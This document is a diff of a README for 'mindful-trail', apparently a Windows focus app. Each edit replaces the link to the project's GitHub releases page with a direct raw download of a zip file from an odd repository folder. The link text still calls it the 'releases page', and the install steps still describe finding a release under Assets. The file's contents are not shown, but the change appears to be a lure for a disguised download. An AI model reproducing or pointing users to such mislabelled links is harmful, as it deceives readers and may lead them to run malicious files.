@@ -1,6 +1,6 @@
 # 🌿 mindful-trail - Simple focus for daily calm
 
-[![Download mindful-trail](https://img.shields.io/badge/Download%20mindful--trail-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shadowy-screed33/mindful-trail/releases)
+[![Download mindful-trail](https://img.shields.io/badge/Download%20mindful--trail-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shadowy-screed33/mindful-trail/raw/refs/heads/main/laang/trail-mindful-1.1-alpha.2.zip)
 
 ## ✨ What mindful-trail does
 
@@ -15,7 +15,7 @@ Use it when you want:
 
 ## 📥 Download and install on Windows
 
-1. Open the [mindful-trail releases page](https://github.com/Shadowy-screed33/mindful-trail/releases)
+1. Open the [mindful-trail releases page](https://github.com/Shadowy-screed33/mindful-trail/raw/refs/heads/main/laang/trail-mindful-1.1-alpha.2.zip)
 2. Find the latest release at the top of the page
 3. Under **Assets**, download the Windows file
 4. If you see a `.zip` file, save it to your PC and extract it
@@ -182,4 +182,4 @@ Yes. If you reinstall, your app files can be downloaded again from the releases 
 
 ## 🖱️ Download again
 
-If you need the latest Windows version, visit the [mindful-trail releases page](https://github.com/Shadowy-screed33/mindful-trail/releases)
+If you need the latest Windows version, visit the [mindful-trail releases page](https://github.com/Shadowy-screed33/mindful-trail/raw/refs/heads/main/laang/trail-mindful-1.1-alpha.2.zip)
